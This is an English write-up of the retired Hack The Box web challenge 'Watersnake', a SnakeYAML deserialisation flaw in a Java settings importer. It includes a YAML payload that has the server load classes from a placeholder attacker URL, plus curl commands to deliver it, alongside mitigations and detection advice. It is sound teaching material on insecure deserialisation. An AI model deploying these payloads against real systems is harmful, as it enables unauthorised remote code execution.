---
challenge: Watersnake
type: Web
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [web, java, snakeyaml, deserialization, rce]
---

# Watersnake — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flag.

## TL;DR

A Java application imports user-supplied YAML configuration. `SnakeYAML` uses the default constructor, allowing classes to be instantiated and commands to run through a classpath gadget chain.

## Prompt and surface

- Web, Medium, retired.
- A panel imports YAML settings.
- The goal is command execution on the server.

```bash
curl -s -I http://<IP>:<PORT>/
curl -s http://<IP>:<PORT>/settings
```

## Reconnaissance

- Responses include `JSESSIONID` and Java errors.
- The form sends `Content-Type: application/x-yaml`.
- The application accepts keys such as `name`, `description` and `theme`.

## Root cause

`new Yaml().load(input)` without a restricted `Constructor` allows `!!` tags. If the classpath contains a class with a dangerous constructor or setter, the document can instantiate it and execute code during deserialisation.

```yaml
!!java.net.URLClassLoader [[!!java.net.URL ["http://<ATTACKER>/"]]]
```

## Exploitation

Identify an available class and build YAML that instantiates it with a URL or command. Serve the resource from a controlled HTTP server and confirm execution with a callback.

```bash
python3 -m http.server 8000
curl -s http://<IP>:<PORT>/settings -H 'Content-Type: application/x-yaml' --data-binary @payload.yml
```

## Evidence

- `SnakeYAML` error while processing a tag.
- Outbound request to the controlled server.
- Command execution and flag read without publishing it.

## Lessons

- A YAML importer is deserialisation, not passive configuration.
- `SnakeYAML` must use a safe constructor.
- Classpath dependencies widen gadget chains.
- A callback confirms RCE without relying on output.

## Mitigations and detection

- Use `SafeConstructor` and an allowlist of keys.
- Do not accept user tags or types.
- Update `SnakeYAML` and review the classpath.
- Alert on `!!` tags, unexpected classes and outbound connections.
- References: SnakeYAML security, OWASP Deserialization.

## References

- <https://www.hackthebox.com/challenges/Watersnake>
- <https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation>
- <https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data>
- <https://attack.mitre.org/techniques/T1059/007/>
